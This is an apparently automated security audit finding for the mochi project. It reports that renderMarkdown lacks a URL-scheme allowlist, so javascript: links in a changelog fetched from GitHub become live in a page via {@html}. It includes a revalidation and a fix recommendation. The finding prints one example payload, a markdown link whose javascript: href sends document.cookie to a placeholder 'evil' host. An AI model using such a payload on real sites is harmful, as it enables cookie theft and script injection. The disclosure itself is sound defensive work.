# [MEDIUM] renderMarkdown output has no URL-protocol allowlist and is injected with {@html}, fed by markdown fetched from GitHub at request time

**File:** [`packages/site/src/lib/markdown.ts`](https://github.com/khromov/mochi/blob/main/packages/site/src/lib/markdown.ts#L51-L62) (lines 51, 56, 62)
**Project:** mochi
**Severity:** MEDIUM  •  **Confidence:** medium  •  **Slug:** `dangerous-html`

## Owners

**Suggested assignee:** `stanislav.khromov+github@gmail.com` _(via last-committer)_

## Finding

`renderMarkdown` (L51-66) serialises the hast tree with `toHtml(tree)` (L56) and returns it as a trusted HTML string. Its only runtime caller is `changelog.ts:46`, which renders `CHANGELOG.md` fetched over the network at request time from `raw.githubusercontent.com/khromov/mochi/refs/heads/main/...` (changelog.ts:4,18); the result is handed to `Docs.svelte` and injected at Docs.svelte:63 via `{@html html}` (with an eslint-disable comment asserting it is 'first-party markdown').

Raw HTML is in fact neutralised: mdsvex configures `remark-rehype` with `allowDangerousHtml: true` (producing `raw` nodes), but this file's `toHtml` call passes no options and `hast-util-to-html` defaults `allowDangerousHtml: false`, serialising `raw` nodes as escaped text. What is NOT neutralised is markdown-native link destinations — nothing in the pipeline filters URL schemes. `rehypeExternalLinks.ts:17-18` treats any non-http(s) protocol as 'internal' and returns early, leaving it untouched, and mdsvex's own `external` plugin only adds `rel`. So `[click](javascript:fetch('//evil/'+document.cookie))` in the changelog becomes a live `<a href="javascript:...">` on https://mochi.fast/docs/changelog.

The trust assumption is the weak link: `CHANGELOG.md` is generated by release-please from Conventional Commit subjects, and a squash-merge subject is the PR title — i.e. text authored by an outside contributor, reviewed as a diff rather than as rendered site content. That makes the `{@html}` sink reachable by content the project does not actually author, and the same applies to any future caller of `renderMarkdown` with less-trusted markdown. Impact is click-required script execution in the site origin (no cookie-based auth here, but the demo session cookie and page content are in scope).

## Recommendation

Add `rehype-sanitize` (or a small rehype pass) to the `renderMarkdown` pipeline with a scheme allowlist for `a[href]`/`img[src]` (http, https, mailto, relative, fragment) — this is the pipeline for markdown that 'arrives at runtime', per its own docstring, so it should not assume a trusted author. Dropping `javascript:`/`data:`/`vbscript:` hrefs in `rehypeExternalLinks` instead of early-returning on them would also close the current path.

## Revalidation

**Verdict:** true-positive

This is the same underlying weakness as F5 viewed from the renderer rather than the caller; because the rules scope duplicates to a single file and this one is anchored in `markdown.ts` while F5 is anchored in `changelog.ts`, I am giving it its own verdict, and the analysis confirms it. `renderMarkdown` (L51-66) captures the hast tree inside a rehype plugin and serialises it with a bare `toHtml(tree)` at L56, returning a string its only consumer treats as trusted HTML. I confirmed the two halves of the claim in library source: `hast-util-to-html/lib/index.js:204` defaults `allowDangerousHtml` to `false` and `lib/handle/raw.js` falls through to the `text` serializer, so the `raw` nodes mdsvex produces (it sets `allowDangerousHtml: true` on its own `remark2rehype` at `mdsvex/dist/main-Bo3idoP1.js:24558`) are escaped — meaning the bare `toHtml` call is load-bearing and undocumented, exactly as the finding says; but no stage filters URL schemes, because `mdast-util-to-hast/lib/handlers/link.js` applies only `normalizeUri` and `rehypeExternalLinks.ts:17-19` returns early on any non-http(s) protocol, treating it as 'internal'. There is no CSP on `packages/site` (the repo's only `Content-Security-Policy` is `packages/support/src/embedHeaders.ts`) and no sanitizer dependency anywhere in the tree. I verified by grep that `renderMarkdown` has exactly one caller — `changelog.ts:46`, on text fetched from `raw.githubusercontent.com` at request time — and that `Docs.svelte:63` injects it with `{@html html}` behind an eslint-disable asserting 'first-party markdown', an assumption that is true of the file's provenance but not of its contents: the live `packages/mochi/CHANGELOG.md` shows release-please emitting commit subjects verbatim with only Handlebars HTML escaping, which leaves `[`, `]`, `(`, `)` and `:` untouched, so a squash-merged PR title can carry a markdown link. The practical exploit therefore needs a merged PR title plus a victim click, which keeps likelihood low, but the gap in this file is real and is the correct place to fix it: a function whose own docstring scopes it to 'markdown that arrives at runtime' should not assume a trusted author, and any second caller would inherit the same unguarded sink.
